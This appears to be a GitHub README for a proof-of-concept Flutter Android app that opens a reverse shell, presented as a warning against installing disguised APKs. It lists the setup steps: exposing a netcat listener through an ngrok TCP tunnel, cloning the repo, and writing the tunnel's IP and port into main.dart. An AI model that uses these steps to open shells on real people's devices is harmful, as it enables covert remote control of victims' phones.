# Image and Video
![image](https://github.com/user-attachments/assets/722a4ca1-d29f-4317-a4ac-f7615171ac67)
![image](https://github.com/user-attachments/assets/78edfea9-c019-443d-944c-0ea58b7c522c)

# POC Reverse Shell With Flutter Application

I’m sharing a proof of concept demonstrating how a reverse shell can be implemented within a Flutter application. This is a reminder to always download apps only from trusted sources. Malicious APKs can easily disguise themselves as legitimate apps, like "kad kahwin.apk."

I built this example app entirely in Flutter to show how vulnerabilities can appear even in custom applications, highlighting the need for caution when installing software.

This post is for educational purposes only, aimed at raising awareness about mobile app security. Please remember: avoid downloading apps from unverified sources! 🔒

Attention all resources shared here should only be used with proper permission. Do not use them for any harmful or illegal activities. Stay responsible. Great Power Comes Great Responsibility.

# Installation 
setup ngrok
- ./ngrok authtoken <your_auth_token>
- ./ngrok tcp 443 
- dig 2.tcp.ngrok.io (check ip address ngrok)
*take note of ngrok port and ip address:

setup listener
- nc -lvnp 443

clone repo
- git clone https://github.com/NormanSamsudin/poc-flutter-reverse-shell.git
 
configure reverse shell
- change ip address and port of "ngrok" on file main.dart [ip address: 3.22.53.161, port: 12875] 





